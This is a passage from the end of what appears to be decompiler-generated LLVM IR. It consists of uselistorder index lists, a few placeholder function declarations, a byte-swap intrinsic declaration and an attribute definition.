941, 942, 943, 944, 945, 154, 946, 947, 948, 949, 950, 951, 952, 155, 936, 358, 937, 938, 359, 939, 940, 115, 895, 360, 156, 896, 897, 898, 899, 900, 116, 162, 161, 159, 160, 166, 165, 163, 157, 158, 164, 953, 954, 978, 979, 117, 955, 956, 170, 168, 169, 957, 958, 176, 175, 131, 167, 959, 960, 961, 962, 963, 964, 303, 302, 312, 361, 965, 966, 967, 64, 968, 172, 171, 173, 174, 130, 969, 970, 285, 971, 972, 94, 973, 974, 975, 976, 977, 7, 8, 663, 664, 65, 9, 313, 362, 980, 981, 876, 982, 835, 983, 723, 984, 665, 985, 790, 666, 906, 1272, 1273, 71, 118, 746, 747, 748, 177, 661, 662, 178, 749, 754, 755, 756, 757, 179, 314, 180, 304, 305, 363, 750, 181, 751, 752, 119, 758, 986, 1263, 667, 668, 669, 753, 1266, 987, 1261, 759, 760, 670, 988, 918, 671, 364, 1264, 88, 1265, 724, 10, 989, 990, 991, 992, 89, 993, 182, 994, 995, 996, 997, 998, 999, 1000, 183, 519, 537, 520, 521, 1001, 1002, 1003, 1004, 1005, 1006, 11, 1007, 1008, 90, 1009, 1010, 1011, 1012, 1013, 184, 1014, 522, 538, 523, 524, 1015, 539, 132, 185, 1016, 1017, 1018, 86, 298, 1019, 1020, 41, 120, 540, 286, 13, 12, 186, 1021, 187, 541, 14, 287, 188, 189, 190, 42, 191, 365, 672, 761, 762, 763, 1023, 1022, 1024, 1025, 1026, 1027, 37, 192, 1028, 1029, 1030, 193, 78, 79, 366, 340, 341, 1031, 195, 194, 196, 197, 1032, 1033, 198, 909, 910, 367, 199, 200, 201, 1034, 202, 1035, 697, 698, 699, 81, 43, 700, 80, 44, 701, 702, 368, 703, 369, 704, 370, 705, 706, 708, 203, 204, 707, 299, 45, 72, 306, 709, 205, 15, 710, 673, 674, 677, 678, 679, 675, 676, 680, 681, 533, 682, 206, 683, 684, 685, 686, 687, 688, 689, 690, 274, 273, 373, 691, 374, 692, 375, 693, 372, 694, 16, 695, 696, 376, 371, 377, 711, 412, 413, 378, 712, 379, 211, 210, 542, 121, 213, 212, 543, 122, 215, 214, 544, 123, 217, 216, 545, 124, 546, 209, 208, 207, 289, 300, 290, 291, 292, 380, 725, 218, 219, 733, 726, 727, 728, 729, 730, 731, 732, 288, 734, 735, 46, 736, 220, 381, 87, 764, 765, 766, 767, 295, 768, 769, 770, 294, 771, 772, 773, 774, 221, 775, 777, 776, 125, 126, 222, 293, 224, 223, 778, 225, 226, 66, 227, 229, 779, 780, 781, 782, 228, 230, 783, 784, 47, 48, 82, 785, 231, 786, 787, 317, 315, 788, 316, 789, 383, 83, 49, 791, 127, 318, 384, 792, 793, 232, 233, 794, 382, 795, 236, 796, 797, 798, 799, 235, 234, 237, 800, 801, 50, 51, 128, 802, 803, 17, 18, 19, 20, 804, 805, 238, 320, 806, 385, 807, 386, 808, 387, 809, 388, 810, 389, 811, 390, 812, 319, 813, 242, 815, 816, 817, 818, 240, 239, 243, 819, 820, 52, 53, 814, 241, 822, 821, 21, 22, 23, 24, 823, 244, 824, 825, 322, 826, 391, 827, 392, 828, 393, 829, 394, 830, 395, 831, 396, 832, 321, 833, 397, 834, 248, 837, 838, 839, 840, 246, 245, 249, 841, 842, 54, 55, 836, 247, 843, 56, 398, 844, 846, 847, 848, 849, 399, 850, 25, 26, 27, 28, 29, 845, 250, 851, 852, 328, 853, 327, 854, 326, 855, 325, 856, 323, 857, 324, 858, 400, 859, 862, 863, 864, 252, 253, 865, 866, 57, 860, 861, 251, 868, 867, 869, 254, 870, 871, 331, 872, 330, 873, 329, 874, 401, 875, 878, 879, 880, 256, 257, 258, 882, 883, 58, 881, 877, 255, 885, 886, 884, 887, 259, 888, 889, 334, 890, 333, 891, 332, 892, 402, 893, 1036, 260, 1037, 907, 261, 908, 911, 95, 912, 913, 307, 403, 297, 914, 915, 38, 301, 916, 917, 404, 919, 262, 1038, 920, 921, 922, 923, 1039, 924, 1040, 1041, 1042, 1043, 263, 264, 405, 1044, 1045, 525, 526, 527, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 547, 1059, 1060, 1061, 1062, 1063, 410, 1064, 1065, 548, 1066, 1067, 1068, 528, 1069, 529, 265, 266, 267, 1070, 1071, 1072, 1073, 549, 1074, 1075, 129, 1076, 1077, 550, 1078, 268, 1079, 1080, 1081, 551, 406, 407, 1082, 1083, 552, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 408, 1098, 1093, 1094, 1095, 1096, 553, 1097, 554, 1099, 409, 1100, 1101, 1102, 1103, 1104, 1105, 530, 1107, 1108, 1109, 1110, 1111, 308, 1112, 1115, 1116, 1113, 1114, 270, 269, 1117, 1118, 1119, 1120, 271, 1121, 1122, 275, 1123, 73, 74, 276, 1124, 75, 76, 411, 1125, 1106, 1126, 516, 517, 531, 1127, 532, 1128, 1129, 1130, 1131, 1132, 335, 1133, 336, 1134, 337, 1135, 338, 555, 339, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288 }
  uselistorder i32* @r4, { 45, 58, 59, 60, 5, 61, 62, 63, 6, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 51, 52, 53, 74, 75, 76, 77, 78, 79, 80, 81, 82, 688, 689, 83, 84, 7, 1, 85, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 8, 86, 87, 88, 89, 90, 91, 92, 93, 94, 9, 95, 96, 99, 100, 101, 102, 46, 103, 104, 105, 106, 107, 108, 97, 98, 47, 48, 109, 110, 10, 111, 11, 112, 12, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 13, 133, 134, 135, 14, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 54, 55, 56, 57, 49, 50, 526, 527, 256, 257, 706, 707, 708, 528, 529, 711, 716, 717, 718, 719, 720, 721, 722, 709, 148, 149, 150, 530, 531, 532, 710, 230, 15, 231, 232, 233, 234, 235, 236, 712, 715, 151, 152, 153, 154, 533, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 16, 550, 551, 552, 553, 534, 535, 536, 537, 465, 466, 467, 468, 469, 470, 471, 472, 473, 17, 474, 475, 476, 477, 478, 479, 480, 481, 482, 554, 576, 577, 578, 579, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 36, 568, 569, 0, 570, 571, 572, 573, 574, 575, 180, 181, 182, 713, 714, 441, 442, 378, 379, 258, 259, 260, 261, 262, 263, 264, 155, 156, 157, 265, 266, 267, 4, 268, 269, 270, 271, 272, 273, 274, 580, 581, 582, 2, 583, 275, 276, 584, 585, 18, 586, 587, 588, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 589, 590, 591, 592, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 443, 444, 179, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 224, 225, 226, 227, 228, 229, 237, 19, 20, 21, 22, 23, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 277, 24, 3, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 25, 316, 26, 317, 27, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 28, 342, 29, 343, 30, 344, 31, 345, 346, 347, 348, 32, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 33, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 593, 594, 595, 509, 510, 511, 514, 512, 513, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 34, 627, 37, 628, 629, 42, 630, 632, 633, 634, 41, 631, 35, 635, 636, 637, 638, 639, 640, 641, 40, 642, 643, 644, 39, 645, 646, 647, 38, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 43, 44, 687 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

attributes #0 = { nounwind readnone }
